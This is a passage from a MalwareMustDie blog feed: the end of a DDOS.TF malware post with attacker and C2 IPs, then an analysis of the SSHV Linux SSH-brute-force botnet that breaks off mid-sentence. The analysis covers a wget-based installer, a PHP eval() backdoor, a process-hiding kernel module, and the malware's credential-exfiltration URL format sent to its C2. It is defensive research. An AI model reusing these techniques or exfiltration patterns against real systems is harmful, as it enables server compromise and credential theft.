color=red\u003ESTOP these badness kids, go to decent path. You and your stupid \"anonymous\" mask won't hide you and your ID much..\u003C\/font\u003E \u003Cp\u003E#MalwareMustDie!! \u003Cp\u003E\u003Cbr\u003E \u003Cp\u003E\u003Ch2\u003ERecent attacker IP for ElasticSearch of suspected same actor(same M.O.)\u003C\/h2\u003E \u003Cp\u003EThese are IP source of recent recorded attackers of with same panel\/M.O.: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E173.254.236.11|173.254.236.11.static.quadranet.com.|8100 | 173.254.192.0\/18 | ASN-QUADRANET-GLOBAL | US | quadranet.com | QuadraNet Inc\u003Cbr \/\u003E173.254.236.19|173.254.236.19.static.quadranet.com.|8100 | 173.254.192.0\/18 | ASN-QUADRANET-GLOBAL | US | quadranet.com | QuadraNet Inc\u003Cbr \/\u003E173.254.236.26|173.254.236.26.static.quadranet.com.|8100 | 173.254.192.0\/18 | ASN-QUADRANET-GLOBAL | US | quadranet.com | QuadraNet Inc\u003Cbr \/\u003E173.254.236.55|173.254.236.55.static.quadranet.com.|8100 | 173.254.192.0\/18 | ASN-QUADRANET-GLOBAL | US | quadranet.com | QuadraNet Inc\u003Cbr \/\u003E\u003C\/pre\u003EPlease be noted that these IP are in the same network ASN\/prefix \u003Cb\u003EAS8100 \/ 173.254.192.0\/18 \u003C\/b\u003Eas the latest CNC used: \u003Cb\u003E173.254.236.97\u003C\/b\u003E \u003Cp\u003E\u003Ch2\u003EEpilogue, follow up, additional reference\u003C\/h2\u003E \u003Cp\u003EThank's for the MMD ELF research cool team mates, to B for 1st spotting new ELF that is ending up to a quite long post :), to Y for nice initial analysis on the webshell exploitation, to W1 for digging all resources for exploitation codes, and W2 to spread \u0026 analysis infrastructure, you're all the best. \u003Cp\u003EGood reference for MOF exploitation in Windows WMI can be found here--\u003E [\u003Ca href=\"http:\/\/poppopret.blogspot.de\/2011\/09\/playing-with-mof-files-on-windows-for.html\"\u003E-1-\u003C\/a\u003E][\u003Ca href=\"https:\/\/github.com\/rapid7\/metasploit-framework\/blob\/master\/modules\/exploits\/windows\/smb\/ms10_061_spoolss.rb\"\u003E-2-\u003C\/a\u003E][\u003Ca href=\"http:\/\/2014.hackitoergosum.org\/slides\/day1_WMI_Shell_Andrei_Dumitrescu.pdf\"\u003E-3-\u003C\/a\u003E][\u003Ca href=\"https:\/\/github.com\/tennc\/webshell\/blob\/master\/php\/mof%E6%8F%90%E6%9D%83%E5%B8%A6%E5%9B%9E%E6%98%BE%E5%B8%A6%E6%B8%85%E6%A5%9A%E5%91%BD%E4%BB%A4%E7%89%88%E6%9C%AC.php\"\u003E-4-\u003C\/a\u003E] \u003Cp\u003EThe full view of the panel infection of \u003Cb\u003Eddos.tf\u003C\/b\u003E payloads:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-SGH2lbCnpww\/Vosqqm1Vk6I\/AAAAAAAAULQ\/3ORKhyiCG7U\/s5120\/011.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-SGH2lbCnpww\/Vosqqm1Vk6I\/AAAAAAAAULQ\/3ORKhyiCG7U\/s380\/011.PNG\u003E\u003C\/a\u003E\u003Cp\u003EThe sample \u0026 more info for researchers is shared at kernelmode [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=4168\u0026p=27544#p27544\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003EPlease help to raise detection ratio [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-PHn8sVntaPg\/Vot1Ngi6eNI\/AAAAAAAAUMQ\/hqMX1gqkdyE\/s5120\/014.PNG\"\u003E-1-\u003C\/a\u003E][\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-mKVl0qbEOYY\/Vot1NkbrWSI\/AAAAAAAAUMM\/uc5sp8aTGf0\/s4580\/015.PNG\"\u003E-2-\u003C\/a\u003E]of this new ELF variant.  \u003Cp\u003E\u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E all \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E analysis:\u003Ca href=\"https:\/\/t.co\/bsbzIIVYea\"\u003Ehttps:\/\/t.co\/bsbzIIVYea\u003C\/a\u003E was on \u003Ca href=\"https:\/\/twitter.com\/hashtag\/UNIX?src=hash\"\u003E#UNIX\u003C\/a\u003E\/\u003Ca href=\"https:\/\/twitter.com\/freebsd\"\u003E@FreeBSD\u003C\/a\u003E OS \u0026amp; \u003Ca href=\"https:\/\/twitter.com\/radareorg\"\u003E@radareorg\u003C\/a\u003E+gdb+objdump +posted via \u003Ca href=\"https:\/\/twitter.com\/firefox\"\u003E@firefox\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/684441883750219776\"\u003EJanuary 5, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E sure. we have blacklisted the mentioned C2 domains\/IPs.\u003C\/p\u003E\u0026mdash; liuya (@liuya0904) \u003Ca href=\"https:\/\/twitter.com\/liuya0904\/status\/684317436896620544\"\u003EJanuary 5, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E here\u0026#39;s a different windows sample talking to same servers: \u003Ca href=\"https:\/\/t.co\/hIjBNQ3zsa\"\u003Ehttps:\/\/t.co\/hIjBNQ3zsa\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; Travis Green (@travisbgreen) \u003Ca href=\"https:\/\/twitter.com\/travisbgreen\/status\/684444768403767296\"\u003EJanuary 5, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E Linux\/Ddostf.A, update 12822 \u003Ca href=\"https:\/\/t.co\/6WLuFON7Oh\"\u003Ehttps:\/\/t.co\/6WLuFON7Oh\u003C\/a\u003E ;-)\u003C\/p\u003E\u0026mdash; Michal Malík (@michalmalik) \u003Ca href=\"https:\/\/twitter.com\/michalmalik\/status\/684362093701808128\"\u003EJanuary 5, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E6 new Open signatures, 41 new Pro. ELF.MrBlack, Dridex, Nitol.K, Darkhotel.\u0026#10;\u0026#10;Thanks: Kevin Ross \u0026amp; \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E\u0026#10;\u0026#10;\u003Ca href=\"https:\/\/t.co\/iy0OvKtazz\"\u003Ehttps:\/\/t.co\/iy0OvKtazz\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ET Labs (@ET_Labs) \u003Ca href=\"https:\/\/twitter.com\/ET_Labs\/status\/684923364536745984\"\u003EJanuary 7, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EDdostf Win32+ELF sample: \u003Ca href=\"https:\/\/t.co\/vhlbnJrFuM\"\u003Ehttps:\/\/t.co\/vhlbnJrFuM\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/DBcKZUVBge\"\u003Ehttps:\/\/t.co\/DBcKZUVBge\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/dPGZXCM5N8\"\u003Ehttps:\/\/t.co\/dPGZXCM5N8\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; Benkow wokned (@benkow_) \u003Ca href=\"https:\/\/twitter.com\/benkow_\/status\/686817600647598080\"\u003EJanuary 12, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003ECreate DDoSTf.yar \u0026#10;Rule to detect ELF.DDosTf infection\u0026#10;Ref: \u003Ca href=\"https:\/\/t.co\/4P25nbXsk7\"\u003Ehttps:\/\/t.co\/4P25nbXsk7\u003C\/a\u003E\u0026#10;Thanks \u003Ca href=\"https:\/\/twitter.com\/benkow_\"\u003E@benkow_\u003C\/a\u003E \u0026#10;\u0026#10;\u003Ca href=\"https:\/\/t.co\/B6ra6jjICy\"\u003Ehttps:\/\/t.co\/B6ra6jjICy\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; Yara Rules (@yararules) \u003Ca href=\"https:\/\/twitter.com\/yararules\/status\/687281694827765760\"\u003EJanuary 13, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003C!-----XREFs https:\/\/github.com\/tennc\/webshell\/blob\/master\/php\/mof%E6%8F%90%E6%9D%83%E5%B8%A6%E5%9B%9E%E6%98%BE%E5%B8%A6%E6%B8%85%E6%A5%9A%E5%91%BD%E4%BB%A4%E7%89%88%E6%9C%AC.php http:\/\/www.geocities.jp\/arc_ocd\/ddos.tf\/ http:\/\/www.dummy-english.com:8080\/ http:\/\/poppopret.blogspot.de\/2011\/09\/playing-with-mof-files-on-windows-for.html https:\/\/github.com\/rapid7\/metasploit-framework\/blob\/master\/modules\/exploits\/windows\/smb\/ms10_061_spoolss.rb http:\/\/2014.hackitoergosum.org\/slides\/day1_WMI_Shell_Andrei_Dumitrescu.pdf ----\u003E\u003Cp\u003EStay safe! Happy New Year 2016 form MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/2277574436230007453\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/01\/mmd-0048-2016-ddostf-new-elf-windows.html#comment-form","title":"1 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/2277574436230007453"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/2277574436230007453"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/01\/mmd-0048-2016-ddostf-new-elf-windows.html","title":"MMD-0048-2016 - DDOS.TF = (new) ELF \u0026 Win32 DDoS service with ASP + PHP\/MySQL MOF webshells"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-wwCu_yO9BDg\/VoqNCH2LmtI\/AAAAAAAAUGc\/5exeTAGhWO8\/s72-c\/004.PNG","height":"72","width":"72"},"thr$total":{"$t":"1"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-1945929060245912978"},"published":{"$t":"2015-12-23T09:52:00.003-08:00"},"updated":{"$t":"2015-12-26T09:29:46.649-08:00"},"title":{"type":"text","$t":"MMD-0047-2015 - SSHV: SSH bruter ELF botnet malware w\/hidden process kernel module"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003EApparently \u003Ci\u003ELinux ELF malware\u003C\/i\u003E is becoming an \u003Ci\u003Einteresting attraction\u003C\/i\u003E from several actors from People Republic of China(in short: PRC). This post is one good example about it. It explains also why myself, from my team (MMD), put many effort to study Linux executable malicious scheme came from that region recently, so does our colleges professional researchers in industry started to put serious effort for this specific threat fro this specific region.   \u003Cp\u003EThe usage for Linux as the biggest backbone in our internet services, and its OS flexibility to support a lot of processor architecture has made Linux OS as a majority in market of embedded platform used in our the Internet of Things, from \u003Ci\u003Erouters \u003C\/i\u003Eto \u003Ci\u003Etelevision\u003C\/i\u003E, from \u003Ci\u003Eweb camera\u003C\/i\u003E to \u003Ci\u003Ecar control system\u003C\/i\u003E. This fact has also attracted \u003Ci\u003Emalware actors\u003C\/i\u003E to overcome and conquer Linux with malicious usage from its \u003Ci\u003Esystem internals (kernel)\u003C\/i\u003E, its web services supported with \u003Ci\u003Evarious script programming\u003C\/i\u003E, and \u003Ci\u003Evulnerabilities\u003C\/i\u003E of its \u003Ci\u003Eremote management access\u003C\/i\u003E ; and this post is explaining these exploited aspects.  \u003Cp\u003EToday, one of my friends who is also focusing in monitoring \u003Ci\u003EELF malware threat\u003C\/i\u003E \u003Cb\u003EMr. Michal Malik\u003C\/b\u003E was mentioning me an interesting ELF sample he spotted in VirusTotal:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-qWgXOqfX7PM\/VnrGBDSv3ZI\/AAAAAAAAT7g\/iOnEP1mmnfI\/s5544\/001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qWgXOqfX7PM\/VnrGBDSv3ZI\/AAAAAAAAT7g\/iOnEP1mmnfI\/s444\/001.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe sample was uploaded from China mainland network in PRC to \u003Ci\u003EVirusTotal\u003C\/i\u003E. \u003Cb\u003EIt's a new undetected malware\u003C\/b\u003E that raises my interest to check it, and this is where the story starts.  \u003Cp\u003E\u003Ch2\u003EMalware's installer and its overall malicious scheme\u003C\/h2\u003E \u003Cp\u003EThe malware file (md5: \u003Cb\u003Edfc09aa4b5c7b49d804d2ce046defb60\u003C\/b\u003E [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/fcdb32cb8c21fd9f45249aa6b6f7895744f55b0668ff8f14229f882cc0b8cb84\/analysis\/\"\u003Elink\u003C\/a\u003E]) is an \u003Ci\u003Ex32 binary\u003C\/i\u003E of a \u003Ci\u003Edynamically unstripped ELF structure\u003C\/i\u003E with readable database. I urge to them who interest in ELF analysis to take a look at the sample directly while reading the following explanation as reference.  \u003Cp\u003ETogether with its overall malicous scheme of this infection, I will explain the malware binary functionality. Let's start with the \u003Ci\u003Emalware installation bash script\u003C\/i\u003E first, please see the illustration of its \u003Ci\u003Einstaller code\u003C\/i\u003E below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-lzquvuMiErA\/VnrdBFGVnPI\/AAAAAAAAT8I\/TdIMBg7TnNw\/s520\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-lzquvuMiErA\/VnrdBFGVnPI\/AAAAAAAAT8I\/TdIMBg7TnNw\/s580\/004.png\u003E\u003C\/a\u003E\u003Cbr\u003EAlong with the set of accompanied malicious files, this ELF malware file (\u003Ci\u003Ethe sample\u003C\/i\u003E) is downloaded from its \u003Ci\u003Edownload CNC host\u003C\/i\u003E \u003Cb\u003E\u003Ci\u003Evia an openly accessed HTTP protocol\u003C\/i\u003E\u003C\/b\u003E, and is being executed under \u003Ci\u003E\"God Mode\" \u003Cb\u003E777 \u003C\/b\u003Epermission\u003C\/i\u003E as \u003Ci\u003Ea daemon\u003C\/i\u003E. The accompanied malware components files, are supposed to be \u003Cb\u003Ea kernel module in C code\u003C\/b\u003E and the binary build-compilation component \u003Ci\u003EMakefile \u003C\/i\u003Efile are also downloaded by the same method.  \u003Cp\u003EThe installer will create the text of \u003Ci\u003EPHP script\/code\u003C\/i\u003E with a short commands (see the picture below) which means \u003Ci\u003Eto extract\u003C\/i\u003E the \u003Cb\u003Eeval()\u003C\/b\u003E value of whatever data sent (obviously via remote) by \u003Cb\u003E\u003Ci\u003EPOST HTTP method\u003C\/i\u003E\u003C\/b\u003E to this malicious file \u003Cb\u003E\"crack\"\u003C\/b\u003E. In the end \u003Cb\u003Ethis \u003Cb\u003E\"crack\"\u003C\/b\u003E code will be saved it in the web server's data directory\u003C\/b\u003E of the victim's server with the filename of \u003Cb\u003E\"crack.php\"\u003C\/b\u003E. It's not careless to assume that via that posted \u003Cb\u003Eeval()\u003C\/b\u003E obviously a \u003Cb\u003Eshell access can be gained\u003C\/b\u003E to \u003Cb\u003Esend activity or command this ELF malware\u003C\/b\u003E action\/daemon, or maybe more.. This is the \u003Cb\u003Ebackdoor process number one \u003C\/b\u003Eon how the malware and infected server can be remotely accessed and controlled by the attacker.  \u003Cp\u003EThe \u003Cb\u003Emalicious kernel module source code\u003C\/b\u003E file, which is a \u003Cb\u003Ecopy-paste code\u003C\/b\u003E from researchers that is very eager to share their malcodes online openly,  will be \u003Ci\u003Ecompiled \u003C\/i\u003Eand \u003Ci\u003Einserted \u003C\/i\u003E(\u003Ci\u003Einsmod\u003C\/i\u003E) to the \u003Ci\u003Evictim's linux kernel\u003C\/i\u003E. This is the kernel module \u003Cb\u003Eto produce the invisibility of the malware process\u003C\/b\u003E among server's processes, \u003Ci\u003Eby manipulation technique \u003C\/i\u003Ein pid dir entry via \u003Cb\u003E\u003Ci\u003ELinux kernel's sys_call_table's hooks\u003C\/i\u003E\u003C\/b\u003E to avoid the administrator or (in some level) scanners or detection tool to spot the \u003Cb\u003Erunning malicious daemon\u003C\/b\u003E. This kernel module is a copy paste from \u003Cb\u003Esome classic PoC code\u003C\/b\u003E with the very slight modification made by the actor adjusted to the daemon used in this threat. The picture below will explain a very limited view of the code:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-NFvRqtSj3Is\/VnrfGzwbAKI\/AAAAAAAAT8U\/EvlRyJj7amo\/s5120\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-NFvRqtSj3Is\/VnrfGzwbAKI\/AAAAAAAAT8U\/EvlRyJj7amo\/s580\/005.png\u003E\u003C\/a\u003E\u003Cbr\u003EThere is a good question about this process hiding kernel mode that had been asked in \u003Cb\u003Ereddit \/r\/Linux\u003C\/b\u003E that I answered, I will share it here too here in following picture \u003Ci\u003Ewithout showing its malicious code\u003C\/i\u003E. It explains \"a bit\" about the kernel internals work of \u003Ci\u003Epost process-hiding manipulation\u003C\/i\u003E coded in this malware and explains \u003Cb\u003Eways to un-hidden it\u003C\/b\u003E.\u003Cbr\u003E \u003C!--- May good Lord in heaven forgives me for revealing this much --\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-TrSeEx7sv54\/Vn7OMGgcS6I\/AAAAAAAAUCY\/-u6DBQyxWQs\/s5120\/007.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-TrSeEx7sv54\/Vn7OMGgcS6I\/AAAAAAAAUCY\/-u6DBQyxWQs\/s580\/007.PNG\u003E\u003C\/a\u003E \u003Cbr\u003E\u003Cfont color=orange\u003EThe point of concern here is the code to hack the sys_call_table entries like \u003Cb\u003E\u003Ci\u003Esys_call_table[SYS_getdents]\u003C\/i\u003E\u003C\/b\u003E in this case, for etc \u003Ci\u003EPoC purpose\u003C\/i\u003E is so wide-spread openly, inspiring its usage for coding \u003Ci\u003Emalware's .ko module\u003C\/i\u003E like this case.\u003C\/font\u003E \u003Cp\u003EThe \u003Ci\u003Emalware binary\u003C\/i\u003E will run with directly connect to \u003Ci\u003Edownload CNC host \u003C\/i\u003Eto \u003Cb\u003Eretrieve \u003Ci\u003Ea word list text file\u003C\/i\u003E\u003C\/b\u003E (with \u003Ci\u003Esystem shell command wget\u003C\/i\u003E). Then \u003Cb\u003Eretrieving the list of IP addresses data\u003C\/b\u003E (with \u003Ci\u003Esystem shell command wget\u003C\/i\u003E also) for the target list ; and parsed them to the \u003Cb\u003Econnection checking function\u003C\/b\u003E following with \u003Cb\u003Ecracking attempt function\u003C\/b\u003E contains commands of the \u003Cb\u003ESSH login attack process\u003C\/b\u003E via two types of authentication : \u003Cb\u003Eby plain text auth\u003C\/b\u003E and \u003Cb\u003Ekeyboard auth\u003C\/b\u003E basis ; to then using brute force attack with the \u003Ci\u003Euser name\u003C\/i\u003E which is \u003Cb\u003Eset to variable value into \"\u003Cb\u003Eroot\"\u003C\/b\u003E by hard coding default\u003C\/b\u003E(It can be changed..) and the \u003Cb\u003Edownloaded word list beforehand as SSH \"password\"\u003C\/b\u003E. Upon a matched password, the malware will gain access the shell of the targeted victim and execute a remote command below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-UF-azNjRaz8\/VnrUcVld8cI\/AAAAAAAAT7w\/AS0TQyaRDlw\/s5585\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-UF-azNjRaz8\/VnrUcVld8cI\/AAAAAAAAT7w\/AS0TQyaRDlw\/s580\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003EAnd will send return code \"\u003Cb\u003E23333\u003C\/b\u003E\" to the \u003Cb\u003Ecrack main function \u003C\/b\u003Eto send the successfully cracked SSH credential to the download CNC via format: \u003Cpre class=\"brush: asm\"\u003E%HOSTNAME%\/sshv.php?out=%s\u0026pass=%s\u003C\/pre\u003Ewhich is also executed by ELF malware using \"wget\" via shell.  \u003Cp\u003ENoted in \u003Ci\u003E\"different version\"\u003C\/i\u003E, there is a deactivated code section explained \u003Ci\u003Ean HTTP network beacon activity\u003C\/i\u003E as per below request:  \u003Cpre class=\"brush: asm\"\u003EProtocol: \"HTTP\/1.1\" \u003Cbr \/\u003Ehost: \"city.ip138.com\" \u003Cbr \/\u003EGET \"\/ip2city.asp\"\u003Cbr \/\u003E\u003C\/pre\u003E- \u003Ci\u003Eto determine the location of the infected server\u003C\/i\u003E. This is \u003Cb\u003Ethe second backdoor function \u003C\/b\u003Eof this malware. There is also being detected another activity to check whether the correct files were downloaded from the CNC download server under specific condition, that can be actually expanded to updates functionality, if the code was activated \u003Cb\u003Ethat would be the third backdoor verdict\u003C\/b\u003E.  \u003Cp\u003EI made a \u003Ci\u003Every rough sketch\u003C\/i\u003E during the my reversing analysis to figure the overall concept of this malware, it's really a private sketch but may help you too to understand the above summary, as per illustration below.. please bear the paintbrush level of graphic, I don't have much time nor luxury to make a neat note.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-MFVWgF9-f-o\/VnrY3bx8RhI\/AAAAAAAAT78\/xpPmgh5N520\/s6120\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-MFVWgF9-f-o\/VnrY3bx8RhI\/AAAAAAAAT78\/xpPmgh5N520\/s580\/003.png\u003E\u003C\/a\u003E \u003Cp\u003EHmm.. I think I wrote the summary a bit too long.. I'm sorry about that..  \u003Cp\u003E\u003Ch2\u003EThe malicious verdict explained in \u003Cb\u003E\u003Ci\u003Ereversing mode\u003C\/i\u003E\u003C\/b\u003E\u003C\/h2\u003E \u003Cp\u003EIn this section I will skip the \u003Ci\u003Estatic analysis\u003C\/i\u003E of the binary form, for the \u003Ci\u003Etips\/reference\u003C\/i\u003E of how I conduct a dynamic link ELF binary please see the previous analysis of \u003Cb\u003EK-Defend malware\u003C\/b\u003E [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/12\/mmd-0045-2015-kdefend-new-elf-threat.html\"\u003Elink\u003C\/a\u003E], and I was doing about the same in this case too.   \u003Cp\u003ESo right now, I will show some pointers of the functions described in the summary above in \u003Ci\u003Ex32 Intel assembly reversed code\u003C\/i\u003E, with some correlation in \u003Ci\u003EC language\u003C\/i\u003E, this section is made for the purpose to \u003Cb\u003EProof of Concept\u003C\/b\u003E the \u003Cb\u003Everdict\/evidence\u003C\/b\u003E of this binary as per summarized in the above section. I am using only \u003Ca href=\"http:\/\/radare.org\"\u003Er2 \u003C\/a\u003Emy beloved platform for malware analysis, for this purpose. I might not cover the whole summary for the limited space and time, so you can feel free to confirm the details.  \u003Cp\u003EThe starting \u003Cb\u003Emain() \u003C\/b\u003Efunction of the malware process, see how \u003Ci\u003Esystem \u003C\/i\u003E(read: shell environment) was invoked by the \u003Ci\u003Ewget commands\u003C\/i\u003E which is used as per below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ae7BmLimmPQ\/Vnrp-W6SRZI\/AAAAAAAAT8k\/5eh-3LnfkGs\/s6620\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ae7BmLimmPQ\/Vnrp-W6SRZI\/AAAAAAAAT8k\/5eh-3LnfkGs\/s580\/006.png\u003E\u003C\/a\u003E \u003Cp\u003EThe \u003Ci\u003Echecking connection process\u003C\/i\u003E was done using the \u003Cb\u003Eping command\u003C\/b\u003E with capturing its \u003Ci\u003Estream\u003C\/i\u003E result.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-g4pTkP9VX0M\/VnrwnatiaSI\/AAAAAAAAT80\/KmsbrbCr3QE\/s5520\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-g4pTkP9VX0M\/VnrwnatiaSI\/AAAAAAAAT80\/KmsbrbCr3QE\/s580\/007.png\u003E\u003C\/a\u003E \u003Cp\u003EThis is the function \u003Ci\u003E0x0804A384\u003C\/i\u003E of what is named as \u003Cb\u003Esshgussing()\u003C\/b\u003E function, which is the typo of the \u003Ci\u003ESSHGuessing \u003C\/i\u003EI guess, explaining the brute SSH authentication session, with \u003Ci\u003Edefault \"root\" password\u003C\/i\u003E used while feeding the passwords, it shows the \u003Cb\u003Eremote shell command executed upon connection success\u003C\/b\u003E,flagging the \u003Ci\u003E\u003Cb\u003E\"crackz\"\u003C\/b\u003E\u003C\/i\u003E pointer into 1, a success message shown afterwards and return value of \"23333\" in its decimal value:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-uj3v9Pu00W0\/Vnr8Pzj498I\/AAAAAAAAT9E\/l8jotLCRGU4\/s5107\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-uj3v9Pu00W0\/Vnr8Pzj498I\/AAAAAAAAT9E\/l8jotLCRGU4\/s580\/008.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WKqcJr4dBIY\/Vnr8P6MlnSI\/AAAAAAAAT9I\/Qo9AV9OfKkQ\/s5120\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WKqcJr4dBIY\/Vnr8P6MlnSI\/AAAAAAAAT9I\/Qo9AV9OfKkQ\/s580\/009.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-bSSgZlCbQ1A\/Vnr8PymF3fI\/AAAAAAAAT9M\/VTot-JZpYe8\/s5120\/010.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-bSSgZlCbQ1A\/Vnr8PymF3fI\/AAAAAAAAT9M\/VTot-JZpYe8\/s580\/010.png\u003E\u003Cbr\u003E\u003C\/a\u003E \u003Cp\u003EThe return value \u003Cb\u003E\"23333\"\u003C\/b\u003E from \u003Cb\u003Esshgussing()\u003C\/b\u003E function will trigger the malware to send the \u003Ci\u003Ecracked \u003C\/i\u003E\u003Cb\u003EIP address and password credential\u003C\/b\u003E to the \u003Ci\u003Eremote host CNC\u003C\/i\u003E via wget to a PHP API file provided in the CNC host for that purpose:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1haz8CWVeqI\/VnsiDaO6pKI\/AAAAAAAAT-U\/fJddLwc8EJo\/s6120\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1haz8CWVeqI\/VnsiDaO6pKI\/AAAAAAAAT-U\/fJddLwc8EJo\/s580\/011.png\u003E\u003C\/a\u003E \u003Cp\u003ETo be clearly noted here: Referring to the description I wrote of the malware until this line, this malware is having another potentially dangerous function to \u003Ci\u003E\u003Cb\u003E\u003Cfont color=orange\u003Eself spread itself as a Worm to infect other host and to another host after that, without even the coder\/herder\/actor always in control for it\u003C\/b\u003E\u003C\/font\u003E\u003C\/i\u003E, as wide ranged as the CNC target IP addresses 